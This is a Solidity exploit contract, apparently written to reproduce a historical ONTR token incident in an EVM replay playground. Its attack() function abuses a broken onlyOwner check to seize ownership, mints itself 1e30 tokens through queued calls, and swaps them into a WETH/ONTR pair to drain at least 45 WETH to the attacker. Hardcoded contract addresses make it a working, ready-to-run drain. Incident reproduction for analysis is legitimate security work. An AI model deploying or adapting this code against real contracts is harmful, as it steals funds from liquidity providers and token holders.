// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone synthetic exploit for the EVM Playground.
// Reproduces the ONTR zero-owner onlyOwner free-mint drain without Foundry
// cheatcodes: seize ownership while owner==0, queue + apply 1e30 balance via
// desertJasper/glenFlash/ashBud, dump into the Pancake WETH/ONTR pair, swap.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IONTR {
    function transferOwnership(address) external;
    function desertJasper(address starField, uint256 meadowWood) external;
    function glenFlash() external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

/// @dev Deployed by the playground recorder; attack() is the recorded entrypoint.
contract ONTRExploit {
    IONTR constant TOKEN = IONTR(0xF074865358B0Dd039beeE075831f8A2Ae6B1F3f3);
    IPair constant PAIR = IPair(0xd46D89f4675bc96328fBDEB443842cdB5Fcd83FD);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Historical inflate amount applied via ashBud (no totalSupply bump)
    uint256 constant INFLATE = 1e30;
    // Historical constructor enforces amountOut >= 45 WETH
    uint256 constant MIN_OUT = 45 ether;

    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");

        // 1. Broken onlyOwner: owner==0 → any caller passes; seize ownership.
        TOKEN.transferOwnership(address(this));

        // 2. onlyOwner queue: desertJasper records (this, 1e30) in moorSouth.
        //    roseBanner(this) is true once we are owner.
        TOKEN.desertJasper(address(this), INFLATE);

        // 3. glenFlash applies all moorSouth entries via ashBud → balance += 1e30
        //    without increasing totalSupply.
        TOKEN.glenFlash();

        // 4. Dump inflated tokens into the pair and swap for WETH → attacker EOA.
        uint256 bal = TOKEN.balanceOf(address(this));
        require(bal >= INFLATE, "inflate failed");
        require(TOKEN.transfer(address(PAIR), INFLATE), "transfer failed");

        (uint112 reserve0, uint112 reserve1,) = PAIR.getReserves();
        // token0 = WETH (0xC02a…), token1 = ONTR
        bool wethIsToken0 = PAIR.token0() == address(WETH);
        uint256 reserveIn = wethIsToken0 ? uint256(reserve1) : uint256(reserve0);
        uint256 reserveOut = wethIsToken0 ? uint256(reserve0) : uint256(reserve1);

        // Historical constructor: UniswapV2-style getAmountOut (×997/1000) then
        // multiplies by 99/100 (bytecode 0x63/0x64) before swap + min-out check.
        uint256 amountInWithFee = INFLATE * 997;
        uint256 amountOut = (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
        amountOut = (amountOut * 99) / 100;
        require(amountOut >= MIN_OUT, "min out");

        if (wethIsToken0) {
            PAIR.swap(amountOut, 0, owner, "");
        } else {
            PAIR.swap(0, amountOut, owner, "");
        }
    }
}
